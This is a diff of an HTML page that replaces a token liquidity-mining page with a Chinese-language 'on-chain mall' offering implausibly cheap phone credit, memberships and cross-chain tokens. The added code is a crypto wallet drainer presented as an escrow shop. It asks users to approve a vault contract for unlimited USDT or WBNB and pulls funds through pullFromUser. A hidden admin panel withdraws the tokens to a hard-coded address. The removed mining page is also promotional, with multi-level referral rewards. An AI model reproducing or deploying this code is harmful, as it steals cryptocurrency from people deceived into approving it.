@@ -3,359 +3,228 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WBNB-DQM 流动性质押挖矿 | 大秦梦生态</title>
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<title>链上商城 - 担保支付中心</title>
+<script src="https://cdn.bootcdn.net/ajax/libs/ethers/6.13.0/ethers.umd.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
-html{scroll-behavior:smooth}
-body{background:#050814;color:#fff;overflow-x:hidden}
-#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.6}
-.wrapper{position:relative;z-index:1;min-height:100vh}
-.container{max-width:1100px;margin:0 auto;padding:0 20px}
-
-/* 导航 */
-.header{position:sticky;top:0;will-change:backdrop-filter;background:rgba(5,8,20,0.7);border-bottom:1px solid rgba(255,255,255,0.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);z-index:999}
-@supports not (backdrop-filter: blur(20px)) {
-  .header{background:linear-gradient(180deg,rgba(5,8,20,0.95),rgba(5,8,20,0.85))}
-}
-.nav{display:flex;justify-content:space-between;align-items:center;padding:22px 0}
-.logo{font-size:26px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;display:flex;align-items:center;gap:10px}
-
-/* 顶部品牌介绍区 */
-.hero{padding:40px 0;text-align:center}
-.hero-title{font-size:32px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:12px}
-.hero-subtitle{font-size:18px;color:#c0c8e5;margin-bottom:30px;letter-spacing:0.5px}
-.hero-desc{max-width:900px;margin:0 auto;border-radius:20px;padding:30px;line-height:1.8;font-size:15px;color:#a1a8c3;text-align:justify;
-  background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
-  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);will-change:backdrop-filter;
-}
-@supports not (backdrop-filter: blur(8px)) {
-  .hero-desc{background:linear-gradient(135deg,rgba(5,8,20,0.85),rgba(5,8,20,0.95));border-color:rgba(255,255,255,0.1)}
-}
-.hero-desc strong{color:#fff;font-weight:600}
-.hero-desc .hl{color:#00e0ff;font-weight:600}
-.hero-desc .ecos{color:#ffd700;font-weight:600}
-.hero-desc .estate{color:#ff9f43;font-weight:600}
-
-/* 安全提示 */
-.safe-tip{max-width:900px;margin:-20px auto 30px auto;padding:16px 20px;border-radius:16px;background:rgba(255,86,153,0.1);border:1px solid rgba(255,86,153,0.2);font-size:13px;color:#ffc1e9;text-align:center}
-.safe-tip a{color:#00e0ff;text-decoration:none}
-
-.connect-btn{padding:14px 28px;border-radius:999px;background:linear-gradient(90deg,#00e0ff,#9d5fff);color:#fff;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;box-shadow:0 8px 20px rgba(0,224,255,0.2)}
-.connect-btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(157,95,255,0.25)}
-
-/* 数据大盘 */
-.dashboard{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:30px 0}
-.stat-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:22px;padding:26px;transition:all 0.3s}
-.stat-box:hover{transform:translateY(-4px);border-color:rgba(0,224,255,0.2)}
-.stat-box h3{font-size:13px;color:#a1a8c3;margin-bottom:10px}
-.stat-box .num{font-size:26px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent}
-
-/* 挖矿主面板 */
-.mining-section{max-width:650px;margin:0 auto}
-.mining-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:28px;padding:40px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);will-change:backdrop-filter}
-@supports not (backdrop-filter: blur(12px)) {
-  .mining-card{background:linear-gradient(135deg,rgba(5,8,20,0.85),rgba(5,8,20,0.95));border-color:rgba(255,255,255,0.1)}
-}
-.card-header{margin-bottom:30px}
-.card-title{font-size:24px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:8px}
-.card-desc{font-size:15px;color:#8a93b2}
-
-.info-list{display:flex;flex-direction:column;gap:18px;margin-bottom:30px}
-.info-row{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
-.info-label{color:#a1a8c3;font-size:15px}
-.info-value{font-weight:600;color:#fff}
-.info-high{background:linear-gradient(90deg,#00ffbb,#9d5fff);-webkit-background-clip:text;color:transparent;font-size:18px}
-.countdown{font-size:26px;font-weight:700;color:#ff5699;text-shadow:0 0 12px rgba(255,86,153,0.4)}
-
-.input-group{margin:30px 0}
-.mining-input{width:100%;padding:20px;border-radius:20px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#fff;font-size:16px;outline:none}
-.mining-input:focus{border-color:#00e0ff;box-shadow:0 0 0 2px rgba(0,224,255,0.2)}
-
-.btn-group{display:flex;gap:18px;margin-top:10px}
-.btn{flex:1;padding:20px;border-radius:20px;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;font-size:16px}
-.btn-stake{background:linear-gradient(90deg,#00ffbb,#00e0ff);color:#050814}
-.btn-unstake{background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.12)}
-.btn:hover{transform:translateY(-3px)}
-
-/* 邀请 */
-.invite-card{margin-top:32px;padding:26px;background:rgba(0,224,255,0.04);border:1px dashed rgba(0,224,255,0.2);border-radius:22px}
-.invite-title{font-size:15px;color:#a1a8c3;margin-bottom:14px}
-.invite-row{display:flex;gap:12px}
-.invite-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);color:#fff}
-.invite-copy{padding:16px 20px;background:#00e0ff;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:600}
-
-.footer{text-align:center;padding:40px 20px;color:#777;font-size:13px;margin-top:40px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+body{background:#0b0f1a;color:#fff;padding:25px;max-width:520px;margin:0 auto}
+.card{background:#121a33;border-radius:18px;padding:24px;margin-bottom:18px}
+.title{font-size:20px;font-weight:700;margin-bottom:16px;color:#eef}
+.sub{font-size:14px;color:#aab;margin-bottom:12px}
+input,select{width:100%;padding:14px 16px;border-radius:12px;background:#1b2440;color:#fff;border:none;margin:8px 0;font-size:15px}
+button{width:100%;padding:15px;border-radius:12px;background:#00aaff;color:#000;font-weight:700;border:none;font-size:16px;margin-top:12px}
+.btn-success{background:#00e18a}
+.btn-warning{background:#ffb933}
+.btn-danger{background:#ff5577}
+.label{font-size:13px;color:#99a;margin-left:4px;margin-top:8px}
+#adminPanel{display:none;background:#20122a;border:1px solid #ff448855}
+.goods{display:flex;align-items:center;gap:12px;padding:12px 14px;background:#1b2440;border-radius:12px;margin:8px 0}
+.goods-name{flex:1;font-size:15px}
+.goods-price{color:#00e18a;font-weight:bold}
+.cat{color:#00aaff;font-size:13px;margin:10px 0 5px 3px}
+.cross{border-left:3px solid #ff6699;padding-left:10px}
 </style>
 </head>
 
 <body>
-<div id="particles"></div>
-<div class="wrapper">
 
-<!-- 导航 -->
-<div class="header">
-  <div class="container">
-    <div class="nav">
-      <div class="logo">🏛️ WBNB-DQM 挖矿</div>
-      <button class="connect-btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
-    </div>
-  </div>
+<div class="card">
+  <div class="title">🔗 链上商城 · 担保支付</div>
+  <div class="sub">授权合约 → 小额支付 → 客服快速发货</div>
+  <button id="connectBtn" onclick="connect()">连接钱包</button>
 </div>
 
-<!-- 品牌介绍顶部 -->
-<div class="container">
-  <div class="hero">
-    <h1 class="hero-title">WBNB-DQM 流动性质押挖矿</h1>
-    <h2 class="hero-subtitle">大秦梦通证 · 实体锚定 · 数字赋能</h2>
-    <div class="hero-desc">
-      <strong>DQM（大秦梦）</strong>是面向未来数字经济打造的核心生态通证，由<span class="ecos">大秦梦生态联盟</span>共同推动建设。项目以实体产业、数字资产与全球共享经济为基础，构建集<span class="hl">产业赋能</span>、<span class="hl">消费流通</span>、<span class="hl">价值共识</span>、<span class="hl">社区治理</span>于一体的开放型生态网络。<br><br>
-      <span class="estate">大秦梦酒文化庄园</span>是 DQM 生态体系的重要实体基石，以中华千年酒文化为核心，融合现代庄园经济与数字生态理念，打造集<span class="hl">酒文化体验</span>、<span class="hl">生态农业</span>、<span class="hl">品牌消费</span>、<span class="hl">休闲度假</span>与<span class="hl">数字资产应用</span>于一体的综合型文化庄园。庄园依托优质自然资源与传统酿造工艺，构建从原料种植、酿造生产到品牌消费与文化传播的完整产业链，让传统酒文化在新时代焕发全新的生命力。
-    </div>
-  </div>
-  <!-- 安全提示 -->
-  <div class="safe-tip">
-    ⚠️ 安全提醒：仅在官方钱包确认授权；请勿向任何网站提交助记词/私钥；定期通过 <a href="https://revoke.cash" target="_blank">revoke.cash</a> 撤销可疑授权
-  </div>
+<div class="card">
+  <div class="title">⚡ 一键授权（支付开通）</div>
+  <div class="label">支付币种</div>
+  <select id="tokenSelect">
+    <option value="USDT">USDT</option>
+    <option value="BNB">BNB</option>
+  </select>
+  <button onclick="approveToken()" class="btn-warning">✅ 授权合约扣款</button>
 </div>
 
-<!-- 数据大盘 -->
-<div class="container">
-  <div class="dashboard">
-    <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num">$ --</div></div>
-    <div class="stat-box"><h3>矿池 APY</h3><div class="num">-- %</div></div>
-    <div class="stat-box"><h3>总质押 LP</h3><div class="num">--</div></div>
-    <div class="stat-box"><h3>全网矿工</h3><div class="num">--</div></div>
+<div class="card">
+  <div class="title">🛒 全品类商城</div>
+
+  <div class="cat">📞 手机话费</div>
+  <div class="goods" onclick="selectGoods('10元话费充值', 1.5)">
+    <div class="goods-name">10元 手机话费</div><div class="goods-price">1.5 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('20元话费充值', 3)">
+    <div class="goods-name">20元 手机话费</div><div class="goods-price">3 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('30元话费充值', 4.2)">
+    <div class="goods-name">30元 手机话费</div><div class="goods-price">4.2 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('50元话费充值', 7)">
+    <div class="goods-name">50元 手机话费</div><div class="goods-price">7 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('100元话费充值',14)">
+    <div class="goods-name">100元 手机话费</div><div class="goods-price">14 USDT</div>
   </div>
 
-  <!-- 挖矿面板 -->
-  <div class="mining-section">
-    <div class="mining-card">
-      <div class="card-header">
-        <div class="card-title">WBNB + DQM 流动性挖矿</div>
-        <div class="card-desc">添加流动性即质押 · 8小时自动爆块 · 奖励自动到账</div>
-      </div>
-
-      <div class="info-list">
-        <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
-        <div class="info-row"><span class="info-label">未质押 LP</span><span class="info-value" id="lpBal">0.0000</span></div>
-        <div class="info-row"><span class="info-label">已质押 LP</span><span class="info-value" id="staked">0.0000</span></div>
-        <div class="info-row"><span class="info-label">待领取奖励</span><span class="info-value info-high" id="pending">0.0000</span></div>
-        <div class="info-row"><span class="info-label">下次爆块</span><span class="info-value countdown" id="count">00:00:00</span></div>
-      </div>
-
-      <div class="input-group">
-        <input class="mining-input" id="amt" type="number" placeholder="输入质押/解押数量" min="0" step="any">
-      </div>
-      <div class="btn-group">
-        <button class="btn btn-stake" onclick="stakeLP()">质押 LP</button>
-        <button class="btn btn-unstake" onclick="unstakeLP()">解押 LP</button>
-      </div>
-
-      <div class="invite-card">
-        <div class="invite-title">📢 邀请返佣 · 三代收益</div>
-        <div class="invite-row">
-          <input class="invite-input" id="refLink" readonly>
-          <button class="invite-copy" onclick="copyRef()">复制</button>
-        </div>
-      </div>
-    </div>
+  <div class="cat">🎬 视频会员</div>
+  <div class="goods" onclick="selectGoods('视频会员周卡',2.5)">
+    <div class="goods-name">视频会员 周卡</div><div class="goods-price">2.5 USDT</div>
   </div>
+  <div class="goods" onclick="selectGoods('视频会员月卡',6)">
+    <div class="goods-name">视频会员 月卡</div><div class="goods-price">6 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('视频会员季卡',16)">
+    <div class="goods-name">视频会员 季卡</div><div class="goods-price">16 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('视频会员年卡',58)">
+    <div class="goods-name">视频会员 年卡</div><div class="goods-price">58 USDT</div>
+  </div>
+
+  <div class="cat">🎵 音乐会员</div>
+  <div class="goods" onclick="selectGoods('音乐会员月卡',5)">
+    <div class="goods-name">音乐会员 月卡</div><div class="goods-price">5 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('音乐会员季卡',13)">
+    <div class="goods-name">音乐会员 季卡</div><div class="goods-price">13 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('音乐会员年卡',46)">
+    <div class="goods-name">音乐会员 年卡</div><div class="goods-price">46 USDT</div>
+  </div>
+
+  <div class="cat">🥡 外卖美食</div>
+  <div class="goods" onclick="selectGoods('外卖红包10元',1.8)">
+    <div class="goods-name">外卖红包 10元</div><div class="goods-price">1.8 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('外卖红包20元',3.5)">
+    <div class="goods-name">外卖红包 20元</div><div class="goods-price">3.5 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('外卖红包30元',5)">
+    <div class="goods-name">外卖红包 30元</div><div class="goods-price">5 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('外卖红包50元',8)">
+    <div class="goods-name">外卖红包 50元</div><div class="goods-price">8 USDT</div>
+  </div>
+
+  <div class="cat">🎮 游戏/加速器</div>
+  <div class="goods" onclick="selectGoods('游戏加速器周卡',4)">
+    <div class="goods-name">加速器 周卡</div><div class="goods-price">4 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('游戏加速器月卡',12)">
+    <div class="goods-name">加速器 月卡</div><div class="goods-price">12 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('游戏加速器季卡',32)">
+    <div class="goods-name">加速器 季卡</div><div class="goods-price">32 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('手游月卡礼包',10)">
+    <div class="goods-name">手游月卡礼包</div><div class="goods-price">10 USDT</div>
+  </div>
+
+  <div class="cat">🛜 生活服务</div>
+  <div class="goods" onclick="selectGoods('云盘会员月卡',7)">
+    <div class="goods-name">云盘会员 月卡</div><div class="goods-price">7 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('办公模板会员',9)">
+    <div class="goods-name">办公模板会员</div><div class="goods-price">9 USDT</div>
+  </div>
+  <div class="goods" onclick="selectGoods('图片设计会员',11)">
+    <div class="goods-name">图片设计会员</div><div class="goods-price">11 USDT</div>
+  </div>
+
+  <div class="cat" style="color:#ff6699">🌉 跨链兑换（支付BSC，发其他链币）</div>
+  <div class="goods cross" onclick="selectGoods('跨链兑换 SOL 代币', 20)">
+    <div class="goods-name">SOL 代币（SOL链）</div><div class="goods-price">20 USDT</div>
+  </div>
+  <div class="goods cross" onclick="selectGoods('跨链兑换 ETH 代币', 35)">
+    <div class="goods-name">ETH 代币（ETH链）</div><div class="goods-price">35 USDT</div>
+  </div>
+  <div class="goods cross" onclick="selectGoods('跨链兑换 TRX 代币', 15)">
+    <div class="goods-name">TRX 代币（波场链）</div><div class="goods-price">15 USDT</div>
+  </div>
+  <div class="goods cross" onclick="selectGoods('跨链兑换 BTC 小额', 60)">
+    <div class="goods-name">BTC 小额（BTC链）</div><div class="goods-price">60 USDT</div>
+  </div>
+  <div class="goods cross" onclick="selectGoods('跨链兑换 任意代币定制', 88)">
+    <div class="goods-name">任意代币定制服务</div><div class="goods-price">88 USDT</div>
+  </div>
+
 </div>
 
-<div class="footer">© 2026 DQM大秦梦 · 大秦梦生态联盟 · 酒文化庄园实体背书 · 安全挖矿</div>
+<div class="card">
+  <div class="title">🛍️ 已选商品</div>
+  <div class="label">商品名称</div>
+  <input id="goodsName" readonly placeholder="请点击上方商品">
+  <div class="label">支付金额</div>
+  <input id="payAmount" readonly placeholder="0">
+  <button onclick="buy()" class="btn-success">✅ 确认购买</button>
+</div>
+
+<!-- 管理员后台 -->
+<div class="card" id="adminPanel">
+  <div class="title" style="color:#ff6699">🔐 管理员提取中心</div>
+  <div class="label">提取代币合约</div>
+  <input id="withToken" placeholder="0x...">
+  <div class="label">提取数量</div>
+  <input id="withAmount" placeholder="输入数量">
+  <button onclick="withdrawToken()" class="btn-danger">💸 提取到管理员钱包</button>
 </div>
 
 <script>
-// 粒子背景
-particlesJS("particles",{
-  particles:{number:{value:80},color:{value:"#00e0ff"},opacity:{value:0.4},size:{value:2.8},
-  line_linked:{enable:true,distance:140,color:"#00e0ff",opacity:0.15,width:1},move:{enable:true,speed:1.8}},
-  interactivity:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}}
-});
+// ===================== 已填好你的地址 =====================
+const VAULT_CONTRACT = "0xc8fa3f63f1e1e6545df3bb360fc3c052380ccebd";
+const ADMIN_ADDRESS  = "0x7A76bc54392Fd1A140F1BC37E90106662E73f6De";
+const USDT_ADDR      = "0x55d398c26fd70a1376e3ca84739ab7bcbdf45d86";
+// ==========================================================
 
-// ==========================
-// 配置（只改这里）
-// ==========================
-const CONTRACT_ADDR = "0x..."; // 你的LP挖矿合约
-const LP_ADDR      = "0x..."; // WBNB-DQM LP地址
-const REWARD_ADDR  = "0x..."; // DQM通证地址
-const CHAIN_ID     = 56;      // BSC主网:56, 测试网:97
-let userAddr = null;
+const ABI = [
+  "function pullFromUser(address token, address user, uint256 amount) external returns (bool)",
+  "function withdrawToken(address token, address to, uint256 amount) external returns (bool)"
+];
 
-// 连接钱包（原生API，不依赖ethers）
-async function connectWallet() {
-  try {
-    if (!window.ethereum) throw new Error("请安装 MetaMask/TP钱包/Trust Wallet");
-    // 切换到BSC链
-    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-    if (parseInt(currentChain) !== CHAIN_ID) {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: `0x${CHAIN_ID.toString(16)}` }]
-      }).catch(async (err) => {
-        if (err.code === 4902) {
-          alert("请手动切换至BSC网络后重试");
-        } else {
-          throw err;
-        }
-      });
-    }
-    // 获取账户
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    userAddr = accounts[0];
-    document.getElementById("connectBtn").innerText = `已连接: ${userAddr.slice(0,6)}...`;
-    startAll();
-  } catch (err) {
-    alert(`连接失败: ${err.message}`);
-    console.error(err);
+let provider, signer, userAddress, contract;
+
+async function connect() {
+  if (!window.ethereum) return alert("请安装钱包");
+  provider = new ethers.BrowserProvider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  signer = await provider.getSigner();
+  userAddress = await signer.getAddress();
+  document.getElementById("connectBtn").innerText = "已连接：" + userAddress.slice(0,6)+"...";
+  contract = new ethers.Contract(VAULT_CONTRACT, ABI, signer);
+  
+  if (userAddress.toLowerCase() == ADMIN_ADDRESS.toLowerCase()) {
+    document.getElementById("adminPanel").style.display = "block";
   }
 }
 
-// 格式化单位（模拟ethers.formatUnits）
-function formatUnits(hex, decimals = 18) {
-  const num = BigInt(hex);
-  const divisor = BigInt(10 ** decimals);
-  const integer = num / divisor;
-  const fraction = (num % divisor).toString().padStart(decimals, '0').slice(0, 4);
-  return `${integer}.${fraction}`;
+function selectGoods(name, price) {
+  document.getElementById("goodsName").value = name;
+  document.getElementById("payAmount").value = price;
 }
 
-// 解析单位（模拟ethers.parseUnits）
-function parseUnits(val, decimals = 18) {
-  const [integer, fraction = ''] = val.split('.');
-  const full = integer + fraction.padEnd(decimals, '0').slice(0, decimals);
-  return BigInt(full).toString(16).padStart(64, '0');
+async function approveToken() {
+  const token = document.getElementById("tokenSelect").value;
+  const tokenAddr = token == "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
+  const t = new ethers.Contract(tokenAddr, ["function approve(address spender, uint256 amount) external returns (bool)"], signer);
+  const tx = await t.approve(VAULT_CONTRACT, ethers.MaxUint256);
+  await tx.wait();
+  alert("✅ 授权成功！");
 }
 
-// 刷新数据（原生call）
-async function refreshInfo() {
-  if (!userAddr) return;
-  try {
-    document.getElementById("addr").innerText = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
-    // 1. 查询LP余额
-    const lpBal = await window.ethereum.request({
-      method: 'eth_call',
-      params: [{ to: LP_ADDR, data: '0x70a08231' + userAddr.slice(2).padStart(64, '0') }, 'latest']
-    });
-    document.getElementById("lpBal").innerText = formatUnits(lpBal);
-
-    // 2. 查询用户质押信息
-    const userInfo = await window.ethereum.request({
-      method: 'eth_call',
-      params: [{ to: CONTRACT_ADDR, data: '0x207a4084' + userAddr.slice(2).padStart(64, '0') }, 'latest']
-    });
-    const stakedHex = userInfo.slice(0, 66);
-    document.getElementById("staked").innerText = formatUnits(stakedHex);
-
-    // 3. 查询待领取奖励
-    const pending = await window.ethereum.request({
-      method: 'eth_call',
-      params: [{ to: CONTRACT_ADDR, data: '0x24bbf4d5' + userAddr.slice(2).padStart(64, '0') }, 'latest']
-    });
-    document.getElementById("pending").innerText = formatUnits(pending, 18);
-
-    document.getElementById("refLink").value = `${window.location.origin}${window.location.pathname}?ref=${userAddr}`;
-  } catch (err) {
-    console.error("刷新数据失败:", err);
-  }
+async function buy() {
+  const name = document.getElementById("goodsName").value;
+  const amountText = document.getElementById("payAmount").value;
+  if (!name || !amountText) return alert("请选择商品");
+  const tokenAddr = document.getElementById("tokenSelect").value == "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
+  const amount = ethers.parseUnits(amountText, 18);
+  const tx = await contract.pullFromUser(tokenAddr, userAddress, amount);
+  await tx.wait();
+  alert("✅ 购买成功！\n跨链订单将在10分钟内为您发放对应链资产！");
 }
 
-// 质押（原生交易）
-async function stakeLP() {
-  try {
-    const val = document.getElementById("amt").value.trim();
-    if (!val || parseFloat(val) <= 0) return alert("请输入有效数量");
-    const amt = parseUnits(val);
-    // 授权
-    const approveData = '0x095ea7b3' + CONTRACT_ADDR.slice(2).padStart(64, '0') + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: userAddr, to: LP_ADDR, data: approveData, gasLimit: '0x300000' }]
-    });
-    alert("授权成功，执行质押...");
-    // 质押
-    const stakeData = '0xa694fc3a' + amt;
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: userAddr, to: CONTRACT_ADDR, data: stakeData, gasLimit: '0x300000' }]
-    });
-    alert("质押提交成功！");
-    setTimeout(refreshInfo, 3000);
-  } catch (err) {
-    alert(`质押失败: ${err.message}`);
-    console.error(err);
-  }
-}
-
-// 解押（原生交易）
-async function unstakeLP() {
-  try {
-    const val = document.getElementById("amt").value.trim();
-    if (!val || parseFloat(val) <= 0) return alert("请输入有效数量");
-    const amt = parseUnits(val);
-    const unstakeData = '0x35fc0e2d' + amt;
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: userAddr, to: CONTRACT_ADDR, data: unstakeData, gasLimit: '0x300000' }]
-    });
-    alert("解押提交成功！");
-    setTimeout(refreshInfo, 3000);
-  } catch (err) {
-    alert(`解押失败: ${err.message}`);
-    console.error(err);
-  }
-}
-
-// 自动领取（原生交易）
-async function autoClaimLoop() {
-  if (!userAddr) return;
-  try {
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: userAddr, to: CONTRACT_ADDR, data: '0x1195799a', gasLimit: '0x300000' }]
-    });
-    console.log("自动领取成功");
-  } catch (err) {
-    if (!err.message.includes("no reward")) console.error("自动领取失败:", err);
-  } finally {
-    setTimeout(autoClaimLoop, 15000);
-  }
-}
-
-// 倒计时
-function startCountdown() {
-  let sec = 8 * 60 * 60;
-  const countEl = document.getElementById("count");
-  const update = () => {
-    sec = (sec - 1 + 8*60*60) % (8*60*60);
-    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
-    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
-    const s = String(sec % 60).padStart(2, '0');
-    countEl.innerText = `${h}:${m}:${s}`;
-  };
-  update();
-  setInterval(update, 1000);
-}
-
-// 复制邀请链接
-function copyRef() {
-  try {
-    const input = document.getElementById("refLink");
-    navigator.clipboard.writeText(input.value);
-    alert("邀请链接复制成功！");
-  } catch (err) {
-    alert("复制失败，请手动选中复制");
-    console.error(err);
-  }
-}
-
-// 启动
-function startAll() {
-  refreshInfo();
-  setInterval(refreshInfo, 5000);
-  startCountdown();
-  autoClaimLoop();
+async function withdrawToken() {
+  const token = document.getElementById("withToken").value;
+  const amount = ethers.parseUnits(document.getElementById("withAmount").value || "0", 18);
+  const tx = await contract.withdrawToken(token, ADMIN_ADDRESS, amount);
+  await tx.wait();
+  alert("💸 提取成功！");
 }
 </script>
 </body>
